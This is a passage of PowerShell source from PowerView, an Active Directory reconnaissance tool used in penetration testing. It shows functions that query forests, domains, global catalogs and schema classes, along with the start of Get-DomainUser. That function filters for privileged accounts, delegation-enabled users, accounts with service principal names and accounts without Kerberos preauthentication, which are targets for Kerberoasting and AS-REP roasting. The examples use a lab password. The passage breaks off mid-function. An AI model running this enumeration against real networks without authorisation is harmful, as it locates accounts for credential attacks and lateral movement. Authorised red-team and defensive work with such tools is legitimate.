.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Forest object for the current
forest or the forest specified with -Forest X.

.PARAMETER Forest

The forest name to query for, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target forest.

.EXAMPLE

Get-Forest -Forest external.domain

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-Forest -Credential $Cred

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs a PSObject containing System.DirectoryServices.ActiveDirectory.Forest in addition
to the forest root domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose "[Get-Forest] Using alternate credentials for Get-Forest"

            if ($PSBoundParameters['Forest']) {
                $TargetForest = $Forest
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                $TargetForest = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Forest] Extracted domain '$Forest' from -Credential"
            }

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            # otherwise use the current forest
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($ForestObject) {
            # get the SID of the forest root
            if ($PSBoundParameters['Credential']) {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
            }

            $Parts = $ForestSid -Split '-'
            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
            $ForestObject
        }
    }
}


function Get-ForestDomain {
<#
.SYNOPSIS

Return all domains for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Returns all domains for the current forest or the forest specified
by -Forest X.

.PARAMETER Forest

Specifies the forest name to query for domains.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target forest.

.EXAMPLE

Get-ForestDomain

.EXAMPLE

Get-ForestDomain -Forest external.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestDomain -Credential $Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}


function Get-ForestGlobalCatalog {
<#
.SYNOPSIS

Return all global catalogs for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Returns all global catalogs for the current forest or the forest specified
by -Forest X by using Get-Forest to retrieve the specified forest object
and the .FindAllGlobalCatalogs() to enumerate the global catalogs.

.PARAMETER Forest

Specifies the forest name to query for global catalogs.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestGlobalCatalog

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestGlobalCatalog -Credential $Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.GlobalCatalog
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {
<#
.SYNOPSIS

Helper that returns the Active Directory schema classes for the current
(or specified) forest or returns just the schema class specified by
-ClassName X.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Uses Get-Forest to retrieve the current (or specified) forest. By default,
the .FindAllClasses() method is executed, returning a collection of
[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass] results.
If "-FindClass X" is specified, the [DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]
result for the specified class name is returned.

.PARAMETER ClassName

Specifies a ActiveDirectorySchemaClass name in the found schema to return.

.PARAMETER Forest

The forest to query for the schema, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestSchemaClass

Returns all domain schema classes for the current forest.

.EXAMPLE

Get-ForestSchemaClass -Forest dev.testlab.local

Returns all domain schema classes for the external.local forest.

.EXAMPLE

Get-ForestSchemaClass -ClassName user -Forest external.local

Returns the user schema class for the external.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestSchemaClass -ClassName user -Forest external.local -Credential $Cred

Returns the user schema class for the external.local domain using
the specified alternate credentials.

.OUTPUTS

[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]

An ActiveDirectorySchemaClass returned from the found schema.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($TargetClass in $ClassName) {
                    $ForestObject.Schema.FindClass($TargetClass)
                }
            }
            else {
                $ForestObject.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {
<#
.SYNOPSIS

Finds user/group/computer objects in AD that have 'outlier' properties set.

Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser, Get-DomainGroup, Get-DomainComputer

.DESCRIPTION

A 'reference' set of property names is calculated, either from a standard set preserved
for user/group/computers, or from the array of names passed to -ReferencePropertySet, or
from the property names of the passed -ReferenceObject. Every user/group/computer object
(depending on determined class) are enumerated, and for each object, if the object has a
'non-standard' property set (meaning a property not held by the reference set), the object's
samAccountName, property name, and property value are output to the pipeline.

.PARAMETER ClassName

Specifies the AD object class to find property outliers for, 'user', 'group', or 'computer'.
If -ReferenceObject is specified, this will be automatically extracted, if possible.

.PARAMETER ReferencePropertySet

Specifies an array of property names to diff against the class schema.

.PARAMETER ReferenceObject

Specicifes the PowerView user/group/computer object to extract property names
from to use as the reference set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Find-DomainObjectPropertyOutlier -ClassName 'User'

Enumerates users in the current domain with 'outlier' properties filled in.

.EXAMPLE

Find-DomainObjectPropertyOutlier -ClassName 'Group' -Domain external.local

Enumerates groups in the external.local forest/domain with 'outlier' properties filled in.

.EXAMPLE

Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier

Enumerates computers in the current domain with 'outlier' properties filled in.

.OUTPUTS

PowerView.PropertyOutlier

Custom PSObject with translated object property outliers.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserReferencePropertySet = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $GroupReferencePropertySet = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $ComputerReferencePropertySet = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        # Domain / Credential
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'"
        }

        $SchemaArguments = @{}
        if ($PSBoundParameters['Credential']) { $SchemaArguments['Credential'] = $Credential }
        if ($TargetForest) {
            $SchemaArguments['Forest'] = $TargetForest
        }
    }

    PROCESS {

        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet"
            $ReferenceObjectProperties = $ReferencePropertySet
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set"
            $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass"
        }
        else {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'"
        }

        if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {
            $Objects = Get-DomainUser @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $UserReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {
            $Objects = Get-DomainGroup @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $GroupReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {
            $Objects = Get-DomainComputer @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $ComputerReferencePropertySet
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
        }

        ForEach ($Object in $Objects) {
            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($ObjectProperty in $ObjectProperties) {
                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $ObjectProperty
                    $Out | Add-Member Noteproperty 'Value' $Object.$ObjectProperty
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}


########################################################
#
# "net *" replacements and other fun start below
#
########################################################

function Get-DomainUser {
<#
.SYNOPSIS

Return all users or specific user objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all user objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted. Also accepts DOMAIN\user format.

.PARAMETER SPN

Switch. Only return user objects with non-null service principal names.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER AdminCount

Switch. Return users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER AllowDelegation

Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'

.PARAMETER DisallowDelegation

Switch. Return user accounts that are marked as 'sensitive and not allowed for delegation'

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER PreauthNotRequired

Switch. Return user accounts with "Do not require Kerberos preauthentication" set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainUser -Domain testlab.local

Return all users for the testlab.local domain

.EXAMPLE

Get-DomainUser "S-1-5-21-890171859-3433809279-3366196753-1108","administrator"

Return the user with the given SID, as well as Administrator.

.EXAMPLE

'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

lastlogoff                                   samaccountname
----------                                   --------------
12/31/1600 4:00:00 PM                        dfm.a
12/31/1600 4:00:00 PM                        dfm
12/31/1600 4:00:00 PM                        harmj0y
12/31/1600 4:00:00 PM                        Administrator

.EXAMPLE

Get-DomainUser -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -AdminCount -AllowDelegation

Search the specified OU for privileged user (AdminCount = 1) that allow delegation

.EXAMPLE

Get-DomainUser -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon

Search for users with a primary group ID other than 513 ('domain users') and only return samaccountname and lastlogon

.EXAMPLE

Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED

Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

Get-DomainUser dev\user1 -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=user1)))

distinguishedname
-----------------
CN=user1,CN=Users,DC=dev,DC=testlab,DC=local

.INPUTS

String

.OUTPUTS

PowerView.User

Custom PSObject with translated user property fields.

PowerView.User.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments['Domain'] = $UserDomain
                        Write-Verbose "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = Convert-LDAPProperty -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
